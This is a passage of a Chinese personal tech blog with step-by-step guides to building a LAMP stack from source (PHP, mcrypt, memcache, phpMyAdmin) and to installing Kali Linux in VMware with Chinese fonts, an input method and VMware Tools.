class="line"><span class="attribute">--with-mcrypt</span>=/usr/local/libmcrypt #调用libmcrypt库</span><br><span class="line"><span class="attribute">--with-mysqli</span>=/usr/local/mysql/bin/mysql_config #增加MysqlLi功能</span><br><span class="line">--enable-soap #支持SOAP和Web Services</span><br><span class="line"><span class="attribute">--enable-mbstring</span>=all #支持多字节字符串</span><br><span class="line">--enable-sockets #支持socket（套接字）通信</span><br><span class="line"><span class="attribute">--with-pdo-mysql</span>=/usr/local/mysql #启用mysql的pdo模块支持</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@localhost php-5.5.23]# make</span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">[root@localhost php-5.5.23]# make install</span><br><span class="line"><span class="comment">#编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/47.png" alt="47"></p>
</li>
<li><p>建立PHP配置文件，这个配置文件不用手工建立，也是有模板文件的，只需复制即可 </p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost php<span class="number">-5.5</span><span class="number">.23</span>]# cp /usr/local/src/php<span class="number">-5.5</span><span class="number">.23</span>/php.ini-production /usr/local/php/etc/php.ini</span><br></pre></td></tr></table></figure>
</li>
<li><p>让apache可以识别“.php”扩展名</p>
<p>在安装 PHP 时，在 ./configure 命令中使用 –with-apxs2=/usr/local/apache2/bin/apxs 选项，已经把 PHP 作为模块被 apache 识别了；但是，apache 并不知道哪些扩展名的文件要调用 PHP 模块来解析（如果是 apache 不认识的扩展名，那么客户端在访问时，apache 不会尝试解析，而是提示客户端下载），所以我们需要修改 apache 的配置文件，让 apache 可以识别PHP 脚本的扩展名 ；</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-5.5.23]<span class="comment"># vim /usr/local/apache2/etc/httpd.conf</span></span><br><span class="line"><span class="comment">#修改apache配置文件，加入如下内容</span></span><br><span class="line">AddType application/x-httpd-php <span class="string">.php</span> <span class="string">.phps</span></span><br><span class="line"><span class="comment">#这句话的意思是：如果遇到.php和.phps扩展名，则调用PHP模块来解析这个文件的内容</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/48.png" alt="48"></p>
</li>
<li><p>重启Apache服务器；我们修改了 apache 的配置文件，如果想让这个修改生效，那么必须重启 Apache 服务器；</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost php<span class="number">-5.5</span><span class="number">.23</span>]# /usr/local/apache2/bin/apachectl stop</span><br><span class="line">[<span class="symbol">root@</span>localhost php<span class="number">-5.5</span><span class="number">.23</span>]# /usr/local/apache2/bin/apachectl start</span><br></pre></td></tr></table></figure>

<p>这里最好不要使用 restart 参数，因为对于源码包的 apache 启动命令，restart 参数有时会不起作用 ；</p>
</li>
<li><p>测试PHP环境是否正常；对源码包安装的 apache 来讲，网页的默认保存位置是 <code>/usr/local/apache2/htdocs/</code> 目录。为了测试 PHP 环境是否正常，我们需要在这个目录中建立一个 PHP 文件，看看这个文件是否可以正常显示 ;</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-<span class="number">5.5</span>.<span class="number">23</span>]<span class="comment"># vim /usr/local/apache2/htdocs/index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用浏览器访问<code>index.php</code>;</p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/50.png" alt="50"></p>
</li>
</ol>
<p><strong>继续安装 mcrypt</strong></p>
<blockquote>
<p>因为 mcrypt 是 PHP 的模块，所以需要等到 PHP 安装完成之后，才能按照以下步骤继续安装 mcrypt； </p>
</blockquote>
<ol>
<li><p>编译安装</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd cd /usr/local/src/php-5.5.23/ext/mcrypt</span></span><br><span class="line"><span class="meta">#进入PDO模块的解压缩目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt]<span class="meta"># /usr/local/php/bin/phpize</span></span><br><span class="line"><span class="meta">#使用phpize加载PDO模块</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt]<span class="meta"># ./configure --with-php-config=/usr/local/php/bin/php-config --with-mcrypt=/usr/local/libmcrypt</span></span><br><span class="line"></span><br><span class="line">--<span class="keyword">with</span>-php-config=/usr/<span class="keyword">local</span>/php/bin/php-config <span class="meta">#指定php-config文件的位置</span></span><br><span class="line">--<span class="keyword">with</span>-mcrypt=/usr/<span class="keyword">local</span>/libmcrypt <span class="meta">#调用libmcrypt</span></span><br><span class="line"></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt]<span class="meta"># make</span></span><br><span class="line"><span class="meta">#编译</span></span><br><span class="line">[root<span class="symbol">@localhost</span> mcrypt]<span class="meta"># make install</span></span><br><span class="line"><span class="meta">#编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/51.png" alt="51"></p>
</li>
<li><p>修改PHP配置文件，要想让 PHP 可以识别和使用 memcache 和 mcrypt 模块，还需要修改一下 PHP 的配置文件；这里要先安装memcache（“Linux memcache安装和配置（自启动）”）；</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[root@localhost mcrypt]</span><span class="comment"># vim /usr/local/php/etc/php.ini</span></span><br><span class="line"><span class="comment">#修改PHP配置文件</span></span><br><span class="line"><span class="attr">extension_dir</span> = <span class="string">"./"</span></span><br><span class="line"><span class="comment">#在文件中找到上面这句话，把它改成下面这句</span></span><br><span class="line"><span class="attr">extension_dir</span>=<span class="string">"/usr/local/php/lib/php/extensions/no-debug-zts-20121212/"</span></span><br><span class="line"><span class="comment">#在加入以下两句话</span></span><br><span class="line"><span class="comment">; extension="memcache.so"</span></span><br><span class="line"><span class="comment">; extension="mcrypt.so"</span></span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/52.png" alt="52"></p>
</li>
<li><p>安装完成之后，重启 apache，就可以在 phpinfo 页面中看到这两个模块了；</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost php<span class="number">-5.5</span><span class="number">.23</span>]# /usr/local/apache2/bin/apachectl stop</span><br><span class="line">[<span class="symbol">root@</span>localhost php<span class="number">-5.5</span><span class="number">.23</span>]# /usr/local/apache2/bin/apachectl start</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/54.png" alt="54"></p>
</li>
</ol>
<h2 id="Linux-memcache安装和配置（自启动）"><a href="#Linux-memcache安装和配置（自启动）" class="headerlink" title="Linux memcache安装和配置（自启动）"></a>Linux memcache安装和配置（自启动）</h2><p><strong>memcache客户端安装</strong></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost src]# yum -y install zlib-devel</span><br><span class="line">#安装底层依赖包zlib-devel</span><br><span class="line">[<span class="symbol">root@</span>localhost src]# cd /usr/local/src/memcache<span class="number">-3.0</span><span class="number">.8</span></span><br><span class="line">#进入memcache<span class="number">-3.0</span><span class="number">.8</span>解压缩目录</span><br><span class="line">[<span class="symbol">root@</span>localhost memcache<span class="number">-3.0</span><span class="number">.8</span>]# /usr/local/php/bin/phpize</span><br><span class="line">#用phpize加载memcache模块；这条命令一定要进入memcache目录才能正确执行</span><br><span class="line">[<span class="symbol">root@</span>localhost memcache<span class="number">-3.0</span><span class="number">.8</span>]# ./configure --with-php-config=/usr/local/php/bin/php-config</span><br><span class="line">#编译前配置，指定php-config文件的位置</span><br><span class="line">[<span class="symbol">root@</span>localhost memcache<span class="number">-3.0</span><span class="number">.8</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost memcache<span class="number">-3.0</span><span class="number">.8</span>]# make install</span><br><span class="line">#编译安装</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/53.png" alt="53"></p>
<p><strong>memcache服务器端安装</strong></p>
<p>安装 memcached-1.4.17 服务器端程序 ：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost ~]cd /usr/local/src/memcached<span class="number">-1.4</span><span class="number">.17</span></span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# yum -y install libevent-devel</span><br><span class="line">#安装memcache，需要先安装libevent-devel包</span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# ./configure --prefix=/usr/local/memcache</span><br><span class="line">#编译前配置</span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# make</span><br><span class="line">#编译</span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# make install</span><br><span class="line">#编译安装</span><br><span class="line"></span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# useradd memcache</span><br><span class="line">#添加memcache用户，这个用户只是用来启动服务的，不用设置密码</span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]#/usr/local/memcache/bin/memcached -u memcache &amp;</span><br><span class="line">#在后台启动memcache服务器</span><br><span class="line">[<span class="symbol">root@</span>localhost memcached<span class="number">-1.4</span><span class="number">.17</span>]# netstat -tlun | grep <span class="number">11211</span></span><br><span class="line">tcp <span class="number">0</span> <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">11211</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:* LISTEN</span><br><span class="line">tcp <span class="number">0</span> <span class="number">0</span>::<span class="number">11211</span> ::* LISTEN</span><br><span class="line">udp <span class="number">0</span> <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">11211</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>：*</span><br><span class="line">udp <span class="number">0</span> <span class="number">0</span>::<span class="number">11211</span> ::*</span><br><span class="line">#memcache的端口是<span class="number">11211</span>，已经启动了</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/56.png" alt="56"></p>
<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/57.png" alt="57"></p>
<p>还要保证 memcache 开机自启动，命令如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost memcached-1.4.17]<span class="comment"># vim /etc/rc.local</span></span><br><span class="line"><span class="comment">#修改自启动文件</span></span><br><span class="line">touch /var/<span class="keyword">lock</span>/subsys/<span class="keyword">local</span></span><br><span class="line">/usr/<span class="keyword">local</span>/apache2/<span class="keyword">bin</span>/apachectl <span class="keyword">start</span></span><br><span class="line">/usr/<span class="keyword">local</span>/mysql/<span class="keyword">bin</span>/mysqld_safe <span class="comment">--user=mysql &amp;</span></span><br><span class="line">/usr/<span class="keyword">local</span>/memcache/<span class="keyword">bin</span>/memcached -u memcache &amp;</span><br><span class="line"><span class="comment">#加入memcache启动命令</span></span><br></pre></td></tr></table></figure>

<p>最终，LAMP 环境需要自启动的服务是 apache、mysql 和 memcache。</p>
<h2 id="linux-phpmyadmin安装及配置"><a href="#linux-phpmyadmin安装及配置" class="headerlink" title="linux phpmyadmin安装及配置"></a>linux phpmyadmin安装及配置</h2><p><strong>复制 phpMyAdmin 脚本文件</strong><br><code>/usr/local/apache2/</code>中的<code>htdocs</code>相当于网站根目录WWW；</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cp -r /usr/local/src/phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</span></span><br><span class="line"><span class="meta">#改名复制phpMyAdmin到apache的默认网页目录中</span></span><br><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># cd /usr/local/apache2/htdocs/phpmyadmin/</span></span><br><span class="line"><span class="meta">#进入phpmyadmin目录</span></span><br><span class="line">[root<span class="symbol">@localhost</span> phpmyadmin]<span class="meta"># cp config.sample.inc.php config.inc.php</span></span><br><span class="line"><span class="meta">#复制配置模板文件为真正的配置文件</span></span><br></pre></td></tr></table></figure>

<p>phpMyAdmin 和前面章节中介绍安装的源码包都不太一样，不再是使用 C 语言编写的源码包程序，而是一个使用 PHP 脚本编写的、通过浏览器解释执行的网站项目。所以在安装时，只需把 phpMyAdmin 复制到 apache 的默认网页目录中，并通过浏览器来解释执行这个脚本即可。 </p>
<p><strong>修改 phpMyAdmin 的验证方式</strong></p>
<p>phpMyAdmin 默认识别 3 种验证方式：</p>
<ul>
<li>HTTP 身份验证：调用apache的加密目录模块，在用户登录时，弹出登录窗口，需要输入正确的用户名和密码才能正常登录；</li>
<li>cookie 身份验证：是HTTP身份验证模式的补充，不能使用HTTP身份验证模式的场合都可以使用它，它要求用户必须允许来自phpMyAdmin的cookie进入自己的计算机，即用户需要在浏览器中开启客户端的cookie功能；</li>
<li>config 身份验证：客户端在登录时不再需要输入用户名和密码，就可以直接登录，因为用户名和密码是用明文方式写入config.inc.php配置文件的，所以这种验证方式并不安全，不推荐使用；</li>
</ul>
<ol>
<li><p>HTTP身份验证配置；要想使用 HTTP 身份验证，只需要修改 PHP 的配置文件 config.inc.php，把验证方式改为“http”即可；</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost phpmyadmin]# vim config.inc.php</span><br><span class="line">把 $cfg[<span class="string">'Servers'</span>][<span class="symbol">$i</span>][<span class="string">'auth_type'</span>] = 'cookie';</span><br><span class="line">改为 $cfg[<span class="string">'Servers'</span>][<span class="symbol">$i</span>][<span class="string">'auth_type'</span>] = 'http';</span><br></pre></td></tr></table></figure>

<p><img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/59.png" alt="59"></p>
<p>保存退出后，就可以在浏览器中输入“<a href="http://127.0.0.1/phpmyadmin/index.php”进行访问了；">http://127.0.0.1/phpmyadmin/index.php”进行访问了；</a></p>
<img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/60.png" alt="60">

<p>在登录对话框中输入 MySQL 的管理员“root”和我们刚刚安装 MySQL 时设定的密码“123456”就能登录 phpMyAdmin了。</p>
</li>
</ol>
<p>   <strong>到这里网站就基本搭建好了，可以开始接下来的入坑之路了。</strong></p>
<p>   <img src="/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/1.jpg" alt="1"></p>
</div></article></div><div class="card"><div class="card-image"><a class="image is-7by3" href="/kali%E5%AE%89%E8%A3%85/"><img class="thumbnail" src="/kali%E5%AE%89%E8%A3%85/40.png" alt="kali安装"></a></div><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-03-30T12:42:14.000Z" title="2020-03-30T12:42:14.000Z">2020-03-30</time><span class="level-item"><a class="link-muted" href="/categories/kali/">kali</a></span><span class="level-item">8 分钟 读完 (大约 1210 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/kali%E5%AE%89%E8%A3%85/">kali安装</a></h1><div class="content"><a id="more"></a>

<p>1.创建虚拟机；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/1.png" alt="1"></p>
<p>2.选择典型；下一步；</p>
<img src="/kali%E5%AE%89%E8%A3%85/2.png" alt="2" style="zoom:200%;">

<p>3.选择安装程序光盘映像文件（kali官网下载的kali-Linux iOS镜像文件）；下一步；</p>
<img src="/kali%E5%AE%89%E8%A3%85/3.png" alt="3" style="zoom:200%;">

<p>4.选择Debian版本的aLinux系统；下一步；</p>
<img src="/kali%E5%AE%89%E8%A3%85/4.png" alt="4" style="zoom:200%;">

<p>5.自定义虚拟机名称和安装位置；下一步；</p>
<img src="/kali%E5%AE%89%E8%A3%85/5.png" alt="5" style="zoom:200%;">

<p>6.最大磁盘大小默认，将虚拟磁盘存储为单个文件；下一步；</p>
<img src="/kali%E5%AE%89%E8%A3%85/6.png" alt="6" style="zoom:200%;">

<p>7.完成；</p>
<img src="/kali%E5%AE%89%E8%A3%85/7.png" alt="7" style="zoom:200%;">

<p>8.开启此虚拟机；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/8.png" alt="8"></p>
<p>9.选择图形化安装；</p>
<img src="/kali%E5%AE%89%E8%A3%85/9.png" alt="9" style="zoom:200%;">

<p>10.选择中文；继续；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/10.png" alt="10"></p>
<p>11.选择中国；汉语；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/11.png" alt="11"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/12.png" alt="12"></p>
<p>12.主机名直接默认kali；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/13.png" alt="13"></p>
<p>13.跳过，直接继续；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/14.png" alt="14"></p>
<p>14.设置密码，跟window开机密码类似；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/15.png" alt="15"></p>
<p>15.使用整个磁盘；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/16.png" alt="16"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/17.png" alt="17"></p>
<p>16.将所有文件放在同一个分区中；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/18.png" alt="18"></p>
<p>17.结束分区设定并将修改写入磁盘；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/19.png" alt="19"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/20.png" alt="20"></p>
<p>19.安装系统需要些时间，耐心等待；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/21.png" alt="21"></p>
<p>20.不使用网络镜像；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/22.png" alt="22"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/23.png" alt="23"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/24.png" alt="24"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/25.png" alt="25"></p>
<p>21.完成安装，点继续启动；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/26.png" alt="26"></p>
<p>22.用户名默认为root，密码为先前设置的密码（第14步）；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/27.png" alt="27"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/28.png" alt="28"></p>
<p>打开kali之后出现乱码，这是由于最新版的kali默认不安装中文字体，所以中文会出现乱码；下面需要安装中文字体。</p>
<h2 id="安装中文字体解决乱码"><a href="#安装中文字体解决乱码" class="headerlink" title="安装中文字体解决乱码"></a>安装中文字体解决乱码</h2><p>1.打开终端；<img src="/kali%E5%AE%89%E8%A3%85/29.png" alt="29"></p>
<p>2.输入安装命令：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install ttf-wqy-zenhei</span><br></pre></td></tr></table></figure>

<img src="/kali%E5%AE%89%E8%A3%85/30.png" alt="30" style="zoom:200%;">

<p>出现这种结果说明是安装出现错误；</p>
<p><strong>解决办法：</strong></p>
<p>输入命令，编辑文件：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vi</span> /etc/apt/sources.<span class="keyword">list</span></span><br></pre></td></tr></table></figure>

<p>按 i 进入编辑模式，写入官方源或国内源，这里我写的是阿里云的源；这里因为没有安装vmtools，所以只能手动输入；</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali官方源</span><br><span class="line">deb <span class="string">http:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line">阿里云源</span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line">中科大源</span><br><span class="line">deb <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span></span><br><span class="line"></span><br><span class="line">随便挑一个写进去（国内源会稍微快一点）</span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/31.png" alt="31"></p>
<p>修改完成后按 Esc 退出编辑模式；然后输入 Shift + :wq 保存并退出；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/33.png" alt="33"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/34.png" alt="34"></p>
<p>然后输入命令：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apt update</span></span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/35.png" alt="35"></p>
<p>最后安装中文字体；</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install ttf-wqy-zenhei</span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/36.png" alt="36"></p>
<p>安装成功。</p>
<p><strong>设置中文字体</strong></p>
<p>1.重新配置安装的软件包，输入命令：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">dpkg-reconfigure locales</span></span><br></pre></td></tr></table></figure>

<p>2.选择字符编码，按空格选中，按 Tab 键切换选项；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/37.png" alt="37"></p>
<p>选中 en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8；然后按 Tab 键选择 OK（左边一个）后回车；</p>
<p>3.选择字符；</p>
<p>选择 zh_CN.UTF-8；然后按 Tab 键选择 OK 后回车；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/38.png" alt="38"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/39.png" alt="39"></p>
<p>最后输入命令<code>reboot</code>回车，重启即可。</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/40.png" alt="40"></p>
<h2 id="安装谷歌中文输入法"><a href="#安装谷歌中文输入法" class="headerlink" title="安装谷歌中文输入法"></a>安装谷歌中文输入法</h2><blockquote>
<p>基于fcitx输入法框架安装谷歌输入法。</p>
</blockquote>
<p>打开终端输入如下命令：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> install fcitx</span><br><span class="line">apt-<span class="builtin-name">get</span> install fcitx-googlepinyin</span><br><span class="line">reboot #重启</span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/47.png" alt="47"></p>
<p>更换输入法；输入命令：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">im-<span class="built_in">config</span></span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/48.png" alt="48"></p>
<p>将输入法由默认改为fcitx；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/49.png" alt="49"></p>
<img src="/kali%E5%AE%89%E8%A3%85/50.png" alt="50" style="zoom:200%;">

<p>Ctrl + 空格 可以切换中英文。</p>
<h2 id="安装VMware-Tools"><a href="#安装VMware-Tools" class="headerlink" title="安装VMware Tools"></a>安装VMware Tools</h2><blockquote>
<p>安装VMware Tools后可以实现从物理机拖文件到虚拟机，屏幕自动铺满，粘贴复制，鼠标在物理机和虚拟机之间自由切换等等。</p>
</blockquote>
<p>1.在虚拟机选项中点击安装VMware Tools；<img src="/kali%E5%AE%89%E8%A3%85/41.png" alt="41"></p>
<p>弹出提示，直接叉掉即可；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/42.png" alt="42"></p>
<p>2.然后桌面上会出现VMware Tools，右键点击选择挂载卷；然后双击打开；<img src="/kali%E5%AE%89%E8%A3%85/43.png" alt="43"></p>
<p>3.将压缩文件拖到桌面上；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/44.png" alt="44"></p>
<p><img src="/kali%E5%AE%89%E8%A3%85/45.png" alt="45"></p>
<p>4.然后弹出卷；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/46.png" alt="46"></p>
<p>5.解压文件，打开终端，切换到桌面文件夹，输入命令（tab键可以自动补全文件名）：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tar</span> <span class="selector-tag">zxvf</span> <span class="selector-tag">VMwareTools-10</span><span class="selector-class">.3</span><span class="selector-class">.10-13959562</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br></pre></td></tr></table></figure>

<p><img src="/kali%E5%AE%89%E8%A3%85/51.png" alt="51"></p>
<p>可以看到解压后桌面上多了一个文件夹；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/52.png" alt="52"></p>
<p>6.切换到<code>vmware-tools-distrib</code>文件夹，运行文件<code>vmware-install.pl</code>；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/53.png" alt="53"></p>
<p>根据提示选择回车，yes或no；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/54.png" alt="54"></p>
<p>删除对应的压缩文件和文件夹；</p>
<p><img src="/kali%E5%AE%89%E8%A3%85/55.png" alt="55"></p>
<p>最后<code>reboot</code>重启。</p>
</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="WebDog"></figure><p class="title is-size-4 is-block line-height-inherit">WebDog</p><p class="is-size-6 is-block">少年有梦，不负韶华！</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">4</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p 